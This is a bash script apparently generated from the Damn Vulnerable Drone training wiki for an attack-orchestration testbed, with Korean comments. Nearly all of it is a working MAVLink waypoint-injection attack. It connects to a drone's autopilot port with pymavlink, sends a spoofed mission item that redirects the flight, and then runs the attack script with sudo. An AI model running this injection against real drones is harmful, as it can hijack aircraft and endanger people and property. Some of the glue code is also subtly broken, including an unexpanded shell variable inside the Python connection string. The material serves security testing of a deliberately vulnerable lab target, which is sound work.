#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Waypoint-Injection.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# =======================================================================
# MTD-aware Target Acquisition (from Orchestrator Environment)
# =======================================================================
# 이 스크립트는 attack_orchestrator.py에 의해 TARGET_IP와 TARGET_PORT 환경 변수가
# 설정될 것을 기대하고 실행됩니다.

if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "This script must be run via the attack_orchestrator.py" >&2
    exit 1
fi

echo "[INFO] Attack target acquired from orchestrator: ${TARGET_IP}:${TARGET_PORT}"
# MTD_INTERFACE_END

set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=waypoint-injection src=Waypoint-Injection.md"
log "[BLOCK 1] type=python"
python3 - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil

# Connection to the drone's MAVLink port
connection_string = 'tcp:${TARGET_IP}:5760'
master = mavutil.mavlink_connection(connection_string)
master.wait_heartbeat()
print("[+] Connected to drone")

# Define injected waypoint
seq = 0
frame = mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT
command = mavutil.mavlink.MAV_CMD_NAV_WAYPOINT
current = 0
autocontinue = 1
param1 = 0     # Hold time (sec)
param2 = 0     # Acceptance radius (m)
param3 = 0     # Pass through
param4 = 0     # Yaw angle
latitude = -35.363261
longitude = 149.165230
altitude = 20

# Send the spoofed mission item
master.mav.mission_item_send(
    master.target_system,
    master.target_component,
    seq,
    frame,
    command,
    current,
    autocontinue,
    param1,
    param2,
    param3,
    param4,
    latitude,
    longitude,
    altitude
)

print(f"[!] Injected waypoint at lat={latitude}, lon={longitude}, alt={altitude}m")
PY

log "[BLOCK 2] type=shell"
sudo python3 waypoint_injection.py

